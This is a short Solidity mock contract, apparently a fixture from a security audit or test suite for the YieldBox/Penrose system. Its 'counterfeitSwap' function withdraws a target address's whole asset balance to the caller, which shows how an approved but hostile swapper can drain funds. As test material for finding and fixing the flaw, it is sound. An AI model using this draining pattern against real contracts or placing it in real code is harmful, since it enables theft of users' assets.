// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "tapioca-sdk/dist/contracts/YieldBox/contracts/YieldBox.sol";

interface IPenroseMock {
    function yieldBox() external view returns (YieldBox);
}

contract VulnMultiSwapper {
    function counterfeitSwap(
        IPenroseMock penrose,
        uint256 assetId,
        address target
    ) public {
        penrose.yieldBox().withdraw(
            assetId,
            target,
            msg.sender,
            penrose.yieldBox().amountOf(target, assetId),
            0
        );
    }
}
